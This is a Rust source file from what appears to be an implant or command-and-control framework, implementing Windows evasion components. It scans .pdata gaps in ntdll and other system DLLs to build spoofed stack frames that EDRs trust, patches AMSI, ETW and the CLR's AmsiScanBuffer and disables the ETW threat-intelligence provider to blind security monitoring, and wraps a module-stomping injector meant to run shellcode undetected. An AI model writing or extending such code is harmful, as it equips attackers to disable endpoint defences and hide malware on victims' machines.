//! Live userland-evasion glue: real impls of `nyx-implant-evasionsdk` traits
//! over the live Windows process. P2.1a-i (`PdataGapScanner`) lives here; later
//! steps add `StackSpoofKit` / `BlindKit` / etc. impls alongside.
//!
//! ## Single-source-of-truth rule
//! The algorithmic cores (gap enumeration, frame-chain synthesis, RC4) live
//! ONLY in `nyx-implant-evasionsdk::{gap,frame,rc4}`. This module's job is to
//! feed them *live bytes* read from the process via the PEB walk in
//! [`crate::resolve`], and to turn their RVA outputs into absolute addresses.
//! We never re-parse `RUNTIME_FUNCTION_ENTRY` or recompute gaps here — that
//! would fork the math and silently desync from the unit-tested core.
//! See `docs/WINDOWS_DEV.md §4` (P2.1a-i).

#![cfg(target_os = "windows")]

use crate::resolve;
use nyx_implant_evasionsdk::gap;
use nyx_implant_evasionsdk::{BlindKit, BlindTarget, EvasionError, GapPool, PdataGapScanner};

/// Cap on how many 8-byte-aligned gap anchors we sample per inter-function /
/// tail range. Keeps the `GapPool` bounded (a raw ntdll has ~3900 RUNTIME_
/// FUNCTION entries → without a cap the pool could reach tens of thousands).
/// 8 per range is plenty for BYOUD-Gap leaf-bridge chains (depth typically 8).
const MAX_PER_GAP: usize = 8;

/// The four whitelisted DLLs whose `.pdata` gaps are safe leaf-bridge anchors
/// (all are always-present, signed, system modules — EDRs trust frames whose
/// return addresses land in their export ranges). `win32u.dll`/`wow64.dll` are
/// absent on some builds; a missing module is skipped, not fatal.
const WHITELIST: &[&[u8]] = &[
    b"ntdll.dll",
    b"kernelbase.dll",
    b"win32u.dll",
    b"wow64.dll",
];

/// Real `.pdata` gap scanner: PEB-walk each whitelisted DLL, read its
/// exception directory via [`resolve::pdata_view`], run the pure gap core
/// (`parse_table` → `enumerate_gaps` → `classify_into_pool`), and merge the
/// results into one `GapPool` of **absolute** addresses (`base + rva`).
///
/// Produces the shared `GapPool` that `StackSpoofKit::ByoudGap` (P2.1a-ii) and
/// `SleepmaskKit::Foliage` (P2.1a-iii) borrow.
pub struct LivePdataScanner;

impl PdataGapScanner for LivePdataScanner {
    fn scan(&self) -> Result<GapPool, EvasionError> {
        let mut pool = GapPool::default();
        for &name in WHITELIST {
            // SAFETY: PEB walk reads loader state stable post-load; pdata_view
            // reads a loader-owned, committed section. A module not in the
            // loader list simply yields None and is skipped.
            let base = unsafe { resolve::module_base_by_name(name) };
            let base = match base {
                Some(b) => b,
                None => continue, // win32u/wow64 may be absent — skip, not fatal
            };
            let view = match unsafe { resolve::pdata_view(base) } {
                Some(v) => v,
                None => continue, // module mapped but no .pdata — skip
            };
            // Pure core: bytes → sorted RUNTIME_FUNCTION_ENTRY list.
            let entries = gap::RuntimeFunctionEntry::parse_table(view.bytes);
            // Pure core: entries → gap RVAs (inter-function + tail), sampled
            // every 8 bytes, capped at MAX_PER_GAP per range.
            let gaps = gap::enumerate_gaps(&entries, view.image_size, MAX_PER_GAP);
            if gaps.is_empty() {
                continue;
            }
            // Classify each gap RVA into gaps/ghosts/nops via byte-pattern
            // predicates read from the live image. `image` is the raw bytes
            // from `[base, base+image_size)` so the predicates can inspect the
            // byte at each gap RVA.
            //
            // SAFETY: the whole module image is mapped readable; reading one
            // byte at an in-range RVA is sound.
            let image_bytes = unsafe {
                core::slice::from_raw_parts(base, view.image_size as usize)
            };
            let mut per_module = gap::classify_into_pool(
                &gaps,
                Some(image_bytes),
                // ghost_pred: a real executable byte at the gap → a "ghost"
                // function (code with no .pdata entry). `C3` (ret) at a gap
                // strongly implies a tiny leaf/thunk lives there. Treat any
                // non-zero, non-padding byte as a ghost candidate.
                |_rva, image| -> bool {
                    let img = match image {
                        Some(b) => b,
                        None => return false,
                    };
                    let off = _rva as usize;
                    if off >= img.len() {
                        return false;
                    }
                    // Ghost = executable code at a gap (no .pdata). Strongest
                    // signal: a leaf return (C3 ret / C2 imm16 ret / E8 rel32
                    // call thunk). Treat C3/C2/E8 as ghost candidates.
                    matches!(img[off], 0xC3 | 0xC2 | 0xE8)
                },
                // nop_pred: alignment / padding fills (`90` nop, `CC` int3, or
                // a run of zero bytes) between functions, plus multi-byte NOPs.
                |_rva, image| -> bool {
                    let img = match image {
                        Some(b) => b,
                        None => return false,
                    };
                    let off = _rva as usize;
                    if off >= img.len() {
                        return false;
                    }
                    let b = img[off];
                    b == 0x90 || b == 0xCC || b == 0x00
                        || (b == 0x66 && off + 1 < img.len() && img[off + 1] == 0x90)
                },
            );
            // Promote RVAs to absolute addresses so downstream kits (frame
            // chains, leaf-bridge synthesis) get directly-usable pointers.
            let base_usize = base as usize;
            for a in per_module.gaps.iter_mut() {
                *a += base_usize;
            }
            for a in per_module.ghosts.iter_mut() {
                *a += base_usize;
            }
            for a in per_module.nops.iter_mut() {
                *a += base_usize;
            }
            pool.gaps.extend_from_slice(&per_module.gaps);
            pool.ghosts.extend_from_slice(&per_module.ghosts);
            pool.nops.extend_from_slice(&per_module.nops);
        }
        if !pool.is_usable() {
            // No gaps anywhere = something is badly wrong (every Win10/11/Server
            // ntdll has thousands). Surface it rather than silently degrade.
            return Err(EvasionError::Unresolved("no .pdata gaps on any whitelisted DLL"));
        }
        Ok(pool)
    }
}

// ---- BlindKit (P2.1b) -----------------------------------------------------
//
// Routes the SDK `BlindTarget` enum to the live byte-patch primitives in
// `crate::blind`. Each variant maps to one of the verified x64 patch sequences;
// `blind()` is idempotent (blind.rs short-circuits on `already_patched`), so a
// per-cycle retry from the beacon loop is cheap once the patch has landed.

/// Live userland AMSI/ETW blind: routes [`BlindTarget`] to the byte-patch
/// primitives in [`crate::blind`]. P2.1b adds `NtTraceEvent` (one patch covers
/// the whole `EtwEventWrite*` family); `EtwEventWrite` is kept as the narrower
/// P0 surface, `Amsi`/`Clr` hit the content-scan surfaces.
pub struct LiveBlind;

impl BlindKit for LiveBlind {
    fn blind(&self, target: BlindTarget) -> Result<(), EvasionError> {
        // SAFETY: blind() runs in the single-threaded beacon context after the
        // PEB-walk resolver is up. Each patch is idempotent + restores the
        // original page protection after the write window.
        let r = unsafe {
            match target {
                BlindTarget::NtTraceEvent => {
                    let r = crate::blind::patch_nt_trace_event();
                    // Belt-and-suspenders: also disable the ETW-TI provider's
                    // EnableInfo via NtTraceControl. Best-effort — if it fails,
                    // the byte-patch is still in place. (No inner unsafe: we're
                    // already inside the outer unsafe block at line 160.)
                    let _ = crate::blind::disable_etw_provider(
                        &nyx_implant_evasionsdk::__private::ETW_TI_GUID,
                    );
                    r
                }
                BlindTarget::EtwEventWrite => crate::blind::patch_etw(),
                BlindTarget::Amsi => crate::blind::patch_amsi(),
                BlindTarget::Clr => {
                    // clr.dll!AmsiScanBuffer mirrors amsi.dll's but is less
                    // watched. Resolve + patch it the same way; if the CLR isn't
                    // loaded (common at cold start), surface as Unresolved so the
                    // caller (beacon loop's per-cycle retry) can try again later.
                    match crate::resolve::export_addr(b"clr.dll", b"AmsiScanBuffer") {
                        Some(addr) => crate::blind::patch_at(addr),
                        None => return Err(EvasionError::Unresolved("clr.dll!AmsiScanBuffer")),
                    }
                }
            }
        };
        r.map_err(|msg| EvasionError::Other(heap_str(msg)))
    }
}

/// Copy a `&'static str` error from blind.rs into an owned `String` for
/// `EvasionError::Other`. blind.rs returns `&'static str` literals; we lift
/// them into the SDK's owned-string error variant.
fn heap_str(s: &str) -> alloc::string::String {
    let mut out = alloc::string::String::new();
    out.push_str(s);
    out
}

// ---- ProcessInjectKit (P2.1c) --------------------------------------------
//
// Routes the SDK `ProcessInjectKit::inject(spawn_to, shellcode)` contract to
// `crate::inject::module_stomp`. Module stomping makes the injected shellcode
// disk-backed + RX (a stomped legit DLL's .text) instead of unbacked RWX, so
// Moneta exec-private / PE-sieve unbacked-memory checks pass. The actual
// stomp+resume is gated (`inject::modulestomp_enabled`, default OFF) — the
// data path (CreateProcessW suspended) always runs so it's verifiable, but the
// cross-process write+execute waits for target-side validation.

/// Live process injector: module stomping. See [`crate::inject`] for the
/// technique + why the execution tail is gated.
pub struct ModuleStomper;

impl nyx_implant_evasionsdk::ProcessInjectKit for ModuleStomper {
    fn inject(
        &self,
        spawn_to: &str,
        shellcode: &[u8],
    ) -> Result<nyx_implant_evasionsdk::InjectHandle, EvasionError> {
        // SAFETY: runs in the single-threaded beacon context. With the stomp
        // gate OFF (default) this only creates a suspended sacrificial process
        // and returns its handle — no cross-process write/execute.
        unsafe { crate::inject::module_stomp(spawn_to, shellcode) }
            .map(|h| nyx_implant_evasionsdk::InjectHandle::new(h))
            .map_err(|msg| EvasionError::Other(heap_str(msg)))
    }
}
